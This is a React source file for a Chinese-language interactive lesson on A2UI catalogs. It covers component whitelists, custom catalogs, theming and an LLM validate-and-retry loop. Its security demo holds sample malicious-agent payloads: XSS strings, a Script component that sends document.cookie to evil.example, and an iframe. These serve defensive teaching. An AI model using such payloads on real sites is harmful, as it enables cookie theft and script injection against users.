import { useState } from "react"
import { Bot, RotateCcw, ShieldCheck } from "lucide-react"
import { cn } from "cn"

import { BASIC_CATALOG_ID, TRAVEL_CATALOG_ID, useA2UI } from "@/a2ui"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { ToggleGroup, ToggleGroupItem } from "@/components/ui/toggle-group"
import { CodeBlock, C } from "@/components/learn/code-block"
import { Inspector, MessageLog, SurfacePreview } from "@/components/learn/inspector"
import { DemoCard, LessonShell } from "@/components/learn/lesson-shell"
import { MessageEditor, pretty, useDemo } from "@/components/learn/message-editor"
import { Bullets, Callout, P, Section } from "@/components/learn/prose"

import { bind, comps, create, data, text, V } from "./msg"

// ---------------------------------------------------------------------------
// 恶意 Agent
// ---------------------------------------------------------------------------

const EVIL = [
  create("evil"),
  comps("evil", [
    { id: "root", component: "Column", children: ["title", "xss-text", "script", "iframe", "ok-btn"] },
    text("title", "一个“不怀好意”的 Agent 的尝试", "h4"),
    text("xss-text", "<img src=x onerror=alert('xss')> <script>alert(1)</script>"),
    { id: "script", component: "Script", code: "fetch('https://evil.example/?c=' + document.cookie)" },
    { id: "iframe", component: "HtmlEmbed", html: "<iframe src='https://evil.example'></iframe>" },
    { id: "ok-btn", component: "Button", child: "ok-text", action: { event: { name: "noop" } } },
    text("ok-text", "合法的按钮照常渲染"),
  ]),
]

// ---------------------------------------------------------------------------
// 自定义 catalog
// ---------------------------------------------------------------------------

const flight = (catalogId: string) => [
  { version: V, createSurface: { surfaceId: "trip", catalogId } },
  comps("trip", [
    { id: "root", component: "Card", child: "col" },
    { id: "col", component: "Column", children: ["title", "seg", "hotel-row"] },
    text("title", "东京 5 日游 · 行程概览", "h4"),
    { id: "seg", component: "FlightSegment", from: bind("/flight/from"), to: bind("/flight/to"), departs: bind("/flight/departs"), arrives: bind("/flight/arrives") },
    { id: "hotel-row", component: "Row", children: ["hotel", "rating"], justify: "spaceBetween", align: "center" },
    text("hotel", bind("/hotel/name")),
    { id: "rating", component: "Rating", value: bind("/hotel/score"), max: 5 },
  ]),
  data("trip", { flight: { from: "PVG", to: "HND", departs: "08:35", arrives: "12:20" }, hotel: { name: "新宿 Granbell 酒店", score: 4.4 } }),
]

const RATING_SCHEMA = {
  Rating: {
    type: "object",
    description: "星级评分",
    allOf: [
      { $ref: "common_types.json#/$defs/ComponentCommon" },
      {
        properties: {
          component: { const: "Rating" },
          value: { $ref: "common_types.json#/$defs/DynamicNumber" },
          max: { type: "number", default: 5 },
        },
        required: ["component", "value"],
      },
    ],
  },
}

function CustomCatalogDemo() {
  const [catalog, setCatalog] = useState(TRAVEL_CATALOG_ID)
  const a2ui = useDemo(flight(TRAVEL_CATALOG_ID))
  const pick = (id: string) => {
    if (!id) return
    setCatalog(id)
    a2ui.reset()
    a2ui.send(flight(id))
  }
  return (
    <DemoCard
      title="同一份消息，不同的 catalog"
      description="FlightSegment 和 Rating 只存在于自定义的 travel catalog 中"
      toolbar={
        <ToggleGroup type="single" variant="outline" size="sm" value={catalog} onValueChange={pick}>
          <ToggleGroupItem value={TRAVEL_CATALOG_ID} className="text-xs">travel catalog</ToggleGroupItem>
          <ToggleGroupItem value={BASIC_CATALOG_ID} className="text-xs">basic catalog</ToggleGroupItem>
        </ToggleGroup>
      }
    >
      <div className="grid gap-4 lg:grid-cols-2">
        <SurfacePreview a2ui={a2ui} />
        <div className="flex min-w-0 flex-col gap-2">
          <CodeBlock title="createSurface.catalogId" code={{ catalogId: catalog }} />
          <div className="max-h-52 overflow-y-auto rounded-lg border bg-muted/20 p-2">
            <MessageLog log={a2ui.log} />
          </div>
        </div>
      </div>
    </DemoCard>
  )
}

// ---------------------------------------------------------------------------
// 主题
// ---------------------------------------------------------------------------

const SWATCHES = ["#2563eb", "#16a34a", "#db2777", "#ea580c", "#7c3aed", "#0f172a"]

const themed = (primaryColor: string, agentDisplayName: string) => [
  create("themed", { theme: { primaryColor, agentDisplayName } }),
  comps("themed", [
    { id: "root", component: "Column", children: ["t", "choice", "row"] },
    text("t", "主题只影响“怎么画”，不影响“画什么”", "h5"),
    {
      id: "choice",
      component: "ChoicePicker",
      displayStyle: "chips",
      options: [
        { label: "标准", value: "std" },
        { label: "加急", value: "fast" },
      ],
      value: bind("/mode"),
    },
    { id: "row", component: "Row", children: ["b1", "b2"] },
    { id: "b1", component: "Button", child: "b1t", variant: "primary", action: { event: { name: "go" } } },
    text("b1t", "主要按钮"),
    { id: "b2", component: "Button", child: "b2t", variant: "borderless", action: { event: { name: "later" } } },
    text("b2t", "稍后"),
  ]),
  data("themed", { mode: ["fast"] }),
]

function ThemeDemo() {
  const [color, setColor] = useState(SWATCHES[0])
  const [name, setName] = useState("物流助手")
  const a2ui = useDemo(themed(SWATCHES[0], "物流助手"))
  const apply = (c: string, n: string) => {
    setColor(c)
    setName(n)
    a2ui.reset()
    a2ui.send(themed(c, n))
  }
  return (
    <DemoCard title="theme：品牌与归属" description="createSurface 中的 theme 由 catalog 定义；basic catalog 支持 primaryColor / iconUrl / agentDisplayName">
      <div className="grid gap-4 lg:grid-cols-2">
        <div className="flex flex-col gap-3">
          <div className="flex items-center gap-2">
            {SWATCHES.map((c) => (
              <button
                key={c}
                type="button"
                aria-label={c}
                onClick={() => apply(c, name)}
                className={cn("size-7 rounded-full ring-offset-2 ring-offset-background transition", c === color && "ring-2 ring-foreground")}
                style={{ background: c }}
              />
            ))}
          </div>
          <Input value={name} onChange={(e) => apply(color, e.target.value)} placeholder="agentDisplayName" />
          <CodeBlock code={{ theme: { primaryColor: color, agentDisplayName: name } }} />
        </div>
        <SurfacePreview a2ui={a2ui} />
      </div>
    </DemoCard>
  )
}

// ---------------------------------------------------------------------------
// Prompt → Generate → Validate
// ---------------------------------------------------------------------------

const ATTEMPT_1 = [
  create("gen"),
  comps("gen", [
    { id: "root", component: "Column", children: ["title", "chart", "cta"] },
    { id: "title", component: "Text", variant: "h4" },
    { id: "chart", component: "PieChart", series: [30, 70] },
    { id: "cta", component: "Button", child: "cta-t", action: { event: { name: "details" } } },
    text("cta-t", "查看详情"),
  ]),
]

const ATTEMPT_2 = [
  create("gen"),
  comps("gen", [
    { id: "root", component: "Column", children: ["title", "chart", "cta"] },
    text("title", "本月支出构成", "h4"),
    { id: "chart", component: "Column", children: ["c1", "c2"] },
    text("c1", "餐饮 **30%**"),
    text("c2", "房租 **70%**"),
    { id: "cta", component: "Button", child: "cta-t", action: { event: { name: "details" } } },
    text("cta-t", "查看详情"),
  ]),
]

function LoopDemo() {
  const a2ui = useA2UI()
  const [stage, setStage] = useState<0 | 1 | 2>(0)
  const errors = a2ui.log.filter((e) => e.kind === "error")

  const steps = [
    { title: "Prompt", body: "把用户需求、catalog schema、示例消息一起放进提示词。" },
    { title: "Generate", body: "LLM 输出 A2UI JSON。它并没有被结构化输出强约束，可能出错。" },
    { title: "Validate", body: "按 schema 校验；失败则把标准格式的 error 反馈给 LLM，让它自我修正。" },
  ]

  return (
    <DemoCard
      title="模拟：LLM 的自我纠错循环"
      toolbar={
        <Button size="sm" variant="ghost" onClick={() => { a2ui.reset(); setStage(0) }}>
          <RotateCcw /> 重置
        </Button>
      }
    >
      <div className="grid gap-3 sm:grid-cols-3">
        {steps.map((s, i) => (
          <div key={s.title} className={cn("flex flex-col gap-1 rounded-lg border p-3", stage > 0 && i === 2 && errors.length > 0 && stage === 1 && "border-destructive/50")}>
            <span className="font-mono text-xs text-muted-foreground">{i + 1}. {s.title}</span>
            <span className="text-xs leading-5">{s.body}</span>
          </div>
        ))}
      </div>
      <div className="flex flex-wrap gap-2">
        <Button size="sm" variant={stage === 0 ? "default" : "outline"} disabled={stage !== 0} onClick={() => { a2ui.send(ATTEMPT_1); setStage(1) }}>
          <Bot /> ① LLM 第一次生成
        </Button>
        <Button size="sm" variant={stage === 1 ? "default" : "outline"} disabled={stage !== 1} onClick={() => { a2ui.reset(); a2ui.send(ATTEMPT_2); setStage(2) }}>
          <ShieldCheck /> ② 把 {errors.length || ""} 条 error 反馈给 LLM，重新生成
        </Button>
      </div>
      <div className="grid gap-4 lg:grid-cols-2">
        <SurfacePreview a2ui={a2ui} empty="点击“LLM 第一次生成”" />
        <div className="max-h-80 overflow-y-auto rounded-lg border bg-muted/20 p-2">
          <MessageLog log={a2ui.log} empty="消息与校验错误会出现在这里" />
        </div>
      </div>
      {stage === 1 && (
        <Callout tone="warn" title="校验发现问题">
          Text 缺少必填属性 <C>text</C>；<C>PieChart</C> 不在 catalog 中。这些 error 以标准格式（<C>code: "VALIDATION_FAILED"</C>、<C>path</C>、<C>message</C>）
          发回给 LLM，它就能针对性地修改。
        </Callout>
      )}
      {stage === 2 && (
        <Callout tone="tip" title="修正完成">
          第二次生成补上了 text，并用 catalog 中已有的 Column + Text 替代了不存在的饼图组件。
        </Callout>
      )}
    </DemoCard>
  )
}

export default function CatalogLesson() {
  const evil = useDemo(EVIL)

  return (
    <LessonShell
      slug="catalog"
      intro={
        <>
          前面每条 createSurface 里都有一个 <C>catalogId</C>。它指向的 <strong>catalog</strong> 是 Agent 与客户端之间的契约：有哪些组件、每个组件有哪些属性、
          有哪些函数可以调用。Catalog 同时也是 A2UI 的<strong>安全边界</strong>——不在清单上的东西，客户端一律不渲染。
        </>
      }
      takeaways={[
        "Catalog 用 JSON Schema 定义组件、函数与主题；用 catalogId（通常是 URI）标识。",
        "客户端通过能力声明（supportedCatalogIds）告诉 Agent 自己支持哪些 catalog，Agent 在 createSurface 中选用其一。",
        "不在 catalog 中的组件被拒绝渲染，并以 VALIDATION_FAILED 错误回报；文本永远按文本显示，不会被当成 HTML。",
        "v0.9 是“prompt-first”：schema 写进提示词，生成后校验，错误反馈给 LLM 自我修正。",
      ]}
      quiz={[
        {
          q: "Agent 发送了一个 component 为 \"Script\" 的组件，basic catalog 的客户端会怎么做？",
          options: ["执行其中的代码", "把它当作 Text 渲染", "拒绝渲染该组件，并可向 Agent 报告校验错误", "整个 surface 崩溃"],
          answer: 2,
          explain: "只有 catalog 中注册过的组件类型才会被映射到原生实现。其余组件被隔离，其他合法组件照常渲染。",
        },
        {
          q: "想让 Agent 使用一个“航班卡片”组件，应该怎么做？",
          options: ["让 Agent 在消息里附带组件的 React 代码", "在客户端实现该组件，并把它声明在一份自定义 catalog 中", "用 Text 组件拼 HTML", "修改 A2UI 协议"],
          answer: 1,
          explain: "自定义组件的实现永远属于客户端。Agent 只需在 catalog 的 schema 里看到它的名字和属性。",
        },
      ]}
    >
      <Section title="Catalog 里有什么" kicker="01 · 契约">
        <div className="grid gap-4 md:grid-cols-2">
          <Bullets
            items={[
              <><strong>components</strong>：每种组件的名称与属性 schema（必填项、枚举值、可绑定类型）。</>,
              <><strong>functions</strong>：可调用的函数、参数与返回类型（上一章的 required、formatString…）。</>,
              <><strong>theme</strong>：createSurface 可接受的主题参数。</>,
              <><strong>catalogId</strong>：唯一标识，如 <C>…/v0_9/catalogs/basic/catalog.json</C>。</>,
            ]}
          />
          <CodeBlock
            title="客户端能力声明（随 A2A 消息的 metadata 发送）"
            code={{
              a2uiClientCapabilities: {
                supportedCatalogIds: [BASIC_CATALOG_ID, TRAVEL_CATALOG_ID],
              },
            }}
          />
        </div>
      </Section>

      <Section title="面对恶意 Agent" kicker="02 · 安全">
        <P>
          下面这组消息试图注入 HTML、脚本和 iframe。点击“发送给客户端”，看看渲染器如何处理——以及日志里发回给 Agent 的 <C>error</C>。你也可以自己改写这些消息继续“攻击”。
        </P>
        <DemoCard title="白名单渲染">
          <div className="grid gap-4 lg:grid-cols-2">
            <MessageEditor a2ui={evil} initial={pretty(EVIL)} minHeight={340} />
            <div className="flex min-w-0 flex-col gap-3">
              <SurfacePreview a2ui={evil} />
              <Inspector a2ui={evil} tabs={["log"]} height={200} />
            </div>
          </div>
        </DemoCard>
        <Callout tone="info" title="为什么这是安全的">
          渲染器只做“查表”：<C>component</C> 名称 → 客户端自己的实现。文本内容永远以文本节点插入，URL、颜色等属性也由客户端组件决定如何使用。
          Agent 没有任何途径让客户端执行它提供的代码。
        </Callout>
      </Section>

      <Section title="自定义 catalog" kicker="03 · 扩展">
        <P>
          basic catalog 只是起点。业务可以定义自己的 catalog，加入领域组件（图表、地图、航班卡片……）。组件的样子和行为完全由客户端实现，
          Agent 只需要在 schema 里看到它：
        </P>
        <CodeBlock title="catalog.json 中的 Rating 组件（示意）" code={RATING_SCHEMA} maxHeight={260} />
        <CustomCatalogDemo />
      </Section>

      <Section title="主题" kicker="04 · 外观">
        <ThemeDemo />
        <Callout tone="warn" title="版本提示">
          在 v1.0 候选版中，<C>theme</C> 与 <C>primaryColor</C> 已从 catalog 和 createSurface 中移除，以便把布局与品牌彻底分开。
        </Callout>
      </Section>

      <Section title="Prompt → Generate → Validate" kicker="05 · 生成循环">
        <P>
          v0.9 把 catalog schema 直接放进 LLM 的提示词（prompt-first），而不是依赖结构化输出。这让 catalog 可以写得更丰富，代价是生成结果必须校验。
          校验失败时，把标准格式的错误交还给模型，形成一个自我纠错的循环。
        </P>
        <LoopDemo />
      </Section>
    </LessonShell>
  )
}
